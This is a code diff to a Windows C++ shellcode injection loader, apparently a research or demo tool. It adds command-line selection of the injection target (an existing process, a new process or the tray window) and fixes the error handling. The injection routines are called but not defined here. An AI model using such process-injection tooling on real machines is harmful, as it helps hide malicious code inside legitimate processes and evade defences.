@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include <iostream>
+#include <sstream>
 
 #include "main.h"
 #include "createproc.h"
@@ -17,9 +18,10 @@ typedef enum {
 } INJECTION_POINT;
 
 typedef enum {
-    EXISTING_PROC,
+    EXISTING_PROC = 0,
     NEW_PROC,
-    TRAY_WINDOW
+    TRAY_WINDOW,
+    TARGET_TYPE_COUNT
 } TARGET_TYPE;
 
 using namespace std;
@@ -78,8 +80,31 @@ bool inject_in_existing_process()
     return run_shellcode_in_new_thread(hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
 }
 
-int main()
+int loadInt(const std::string &str)
 {
+    int intVal = 0;
+
+    std::stringstream ss;
+    ss << std::dec << str;
+    ss >> intVal;
+
+    return intVal;
+}
+
+int main(int argc, char *argv[])
+{
+    TARGET_TYPE targetType = TARGET_TYPE::NEW_PROC;
+    if (argc < 2) {
+        std::cout << "args: <targetType>\n";
+        std::cout << "targetType:\n";
+        std::cout << "\t" << std::dec << TARGET_TYPE::EXISTING_PROC << " : EXISTING_PROC\n";
+        std::cout << "\t" << std::dec << TARGET_TYPE::NEW_PROC << " : NEW_PROC\n";
+        std::cout << "\t" << std::dec << TARGET_TYPE::TRAY_WINDOW << " : TRAY_WINDOW\n";
+        std::cout << "\t---\n";
+        std::cout << "\tdefault: " << targetType << " \n";
+    }
+
+
    if (load_ntdll_functions() == FALSE) {
         printf("Failed to load NTDLL function\n");
         return (-1);
@@ -96,9 +121,13 @@ int main()
     if (!is_compiled_32b()) {
         printf("[WARNING] It is recommended to compile the loader as a 32 bit application!\n");
     }
-
     // choose the method:
-    TARGET_TYPE targetType = TARGET_TYPE::NEW_PROC;
+
+    if (argc > 1) {
+        targetType = (TARGET_TYPE)loadInt(argv[1]);
+        if (targetType >= TARGET_TYPE_COUNT) targetType = TARGET_TYPE::NEW_PROC;
+    }
+
     switch (targetType) {
     case TARGET_TYPE::TRAY_WINDOW:
         if (!is_system32b()) {
@@ -108,18 +137,24 @@ int main()
         // this injection is more fragile, use shellcode that makes no assumptions about the context
         if (inject_into_tray(g_Shellcode, sizeof(g_Shellcode))) {
              printf("[SUCCESS] Code injected into tray window!\n");
-             break;
         }
+        break;
     case TARGET_TYPE::EXISTING_PROC:
         if (inject_in_existing_process()) {
             printf("[SUCCESS] Code injected into existing process!\n");
-            break;
         }
+        else {
+            printf("[ERROR] Could not inject code into existing process!\n");
+        }
+        break;
     case TARGET_TYPE::NEW_PROC:
         if (inject_in_new_process(INJECTION_POINT::PATCH_EP)) {
              printf("[SUCCESS] Code injected into a new process!\n");
-             break;
         }
+        else {
+            printf("[ERROR] Could not inject code into a new process!\n");
+        }
+        break;
     }
 
     system("pause");
